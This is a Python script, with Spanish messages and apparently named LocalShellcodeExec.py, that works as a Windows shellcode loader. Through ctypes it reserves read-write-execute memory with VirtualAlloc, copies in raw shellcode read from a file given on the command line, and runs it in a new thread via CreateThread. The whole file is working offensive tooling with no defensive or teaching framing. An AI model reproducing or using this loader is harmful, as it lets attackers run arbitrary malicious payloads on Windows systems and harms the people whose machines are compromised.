import ctypes
import sys
import os
from ctypes import wintypes

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# VirtualAlloc
kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAlloc.restype  = wintypes.LPVOID

# VirtualProtect
kernel32.VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
kernel32.VirtualProtect.restype  = wintypes.BOOL

# CreateThread
kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
kernel32.CreateThread.restype  = wintypes.HANDLE

# WaitForSingleObject
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype  = wintypes.DWORD

def allocate_exec_mem(size):
    addr = kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    if not addr:
        raise Exception("No se pudo reservar memoria ejecutable.")
    return addr

def change_mem_permissions(addr, size, new_protect):
    old_protect = ctypes.c_ulong(0)
    if not kernel32.VirtualProtect(addr, size, new_protect, ctypes.byref(old_protect)):
        raise Exception("No se pudo cambiar permisos de memoria.")
    return old_protect.value

def create_thread(start_addr):
    thread_id = ctypes.c_ulong(0)
    handle = kernel32.CreateThread(None, 0, start_addr, None, 0, ctypes.byref(thread_id))
    if not handle:
        raise Exception("No se pudo crear hilo.")
    return handle

def wait_for_thread(handle):
    kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)


def exec_shellcode(shellcode: bytes):
    size = len(shellcode)

    # Reservar memoria RWX
    addr = kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    if not addr:
        raise ctypes.WinError(ctypes.get_last_error())

    # Copiar shellcode en memoria
    ctypes.memmove(addr, shellcode, size)

    # Crear hilo en esa memoria
    thread_id = wintypes.DWORD(0)
    handle = kernel32.CreateThread(None, 0, addr, None, 0, ctypes.byref(thread_id))
    if not handle:
        raise ctypes.WinError(ctypes.get_last_error())


    kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 LocalShellcodeExec.py <archivo_shellcode>")
        sys.exit(1)

    shellcode_file = sys.argv[1]
    if not os.path.exists(shellcode_file):
        print(f"El archivo {shellcode_file} no existe.")
        sys.exit(1)

    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    exec_shellcode(shellcode)
